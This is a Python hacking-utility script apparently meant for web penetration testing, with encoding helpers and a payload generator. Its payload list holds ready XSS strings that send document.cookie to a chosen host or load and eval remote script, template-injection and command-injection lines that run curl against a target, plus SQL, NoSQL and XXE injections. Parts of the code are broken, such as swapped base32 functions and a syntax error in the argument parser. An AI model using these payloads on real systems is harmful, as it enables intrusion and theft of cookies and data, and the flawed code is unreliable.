#!/bin/python3
import numpy as np 
import pandas as pd
import pyarrow.parquet as pq
import sys

import base64 
import urllib
import html

class Decode:
    def b32(self, user_in):
        return base64.b32encode(user_in)

    def b64(self, user_in):
        return base64.b64decode(user_in)

    def b64url(self, user_in):
        return base64.urlsafe_b64decode(user_in)

    def url(self, user_in):
        return urllib.parse.unquote_plus(user_in)
    
    def html(self, user_in):
        return html.unescape(user_in)

class Encode:
    def b32(self, user_in):
        return base64.b32decode(user_in)

    def b64(self, user_in):
        return base64.b64encode(user_in)

    def b64url(self, user_in):
        return base64.urlsafe_b64encode(user_in)

    def url(self, user_in):
        return urllib.parse.quote_plus(user_in)
    
    def html(self, user_in):
        return html.escape(user_in)

class Analyze:
    def parquet(self, user_in):
        if len(sys.argv) > 1:
            print(F"Data:\n{pq.read_table(sys.argv[1])}")
        else:
            print("Use program with filepath to .parquet file as the first argument!")


class Payload:
    
    placeholder = "|placeholder|"
    payloads = [
        # basic
        "<s> hi {*hi*} {{ 7*7 }} ${7*7} ${{<%[%\'\"}}%\.",
        # HTML
        F"<meta http-equiv=\"refresh\" content=\"0; url={placeholder}\" />",
        # js
        "<img src=x onerror=alert(document.domain) />",
        F"<script>console.log('Domain: ' + document.domain + 'Origin: ' + window.origin))</script>",
        "<scr<script>ipt>alert(document.domain)</scr<script>ipt>",
        "\"><script>alert(document.domain)</script>",
        "<svgonload=alert(document.domain)>",
        "java%0ascript:alert(document.domain)",
        "<object onbeforescriptexecute=confirm(document.domain)>",
        F"<img src=x onerror=this.src='{placeholder}?cookie='+document.cookie>",
        F"\"><script src={placeholder}></script>",
        F"<script>let d=new XMLHttpRequest();d.open(\"GET\",\"{placeholder}\");d.send()</script>",
        F"$.get({placeholder})",
        F"fetch({placeholder})",
        F"<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\GET\, \"//{placeholder}\");a.send();",
        "[a](javascript:prompt(document.cookie)) - Markdown",
        # SSTI
        "${"+placeholder+"}",
        "#{"+placeholder+"}",
        "@{"+placeholder+"}",
        F"@({placeholder})",
        F"[=\"freemarker.template.utility.Execute\"?new()(\"curl {placeholder}\")]",
        "{{"+placeholder+"}}",
        "*{"+placeholder+"}",
        "~{"+placeholder+"}",
        "${{"+placeholder+"}}",
        F"[[{placeholder}]]",
        F"<% {placeholder} %>",
        # SQLi
        "1 or 1=1 -- -",
        "1' or 1=1",
        "1\" or 1=1",
        #NoSQL
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        "true, $where: '1 == 1'",
        # XXE
        "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example 'Doe'> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>\n",
        F"<!ENTITY % xxe PUBLIC 'Random Text' '{placeholder}'>",
        F"<!ENTITY xxe PUBLIC 'Any TEXT' '{placeholder}'>",
        F"<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"{placeholder}\"> %ext;\n]>\n<r></r>",
        F"<!DOCTYPE root [<!ENTITY test SYSTEM '{placeholder}'>]>\n<root>&test;</root>",
        # CMD Injection
        F"`curl {placeholder}`",
        F";curl {placeholder}",
        F";curl$IFS{placeholder}",
        F";{{curl,{placeholder}}}",
        F"$(curl {placeholder})",
    ]

    def list(self):
        x = 0
        print("Payloads:")
        for pl in self.payloads:
            print(F"{x}: {pl}")
            x += 1
    
    def generate(self, target):
        x = 0
        print(F"Payloads for {target}:")
        for pl in self.payloads:
            real_pl = pl.replace(self.placeholder, target)
            print(F"{x}: {real_pl}")
            x += 1

if __name__ == "__main__":
    import argparse

    pl = Payload()
    dc = Decode()
    enc = Encode()
    an = Analyze()

    #TODO handle arguments etc!
    parser = argparse.ArgumentParser(
        usage="%(prog)s [OPTION]"
        description="Utility tools for hacking!"
    )
    parser.add_argument("-p", "--pl", "--payload", help="Payload related functions", choices=[])
    parser.add_argument("-d", "--decode", help="Decoding input using different algorithms", choices=[])
    parser.add_argument("-e", "--enc", "--encode", help="Encoding input using different algorithms", choices=[])
    parser.add_argument("-a", "--analyze", help="Analyze the input (usually a file) using different techniques", choices=[])

    # TODO handle different sub-options for a command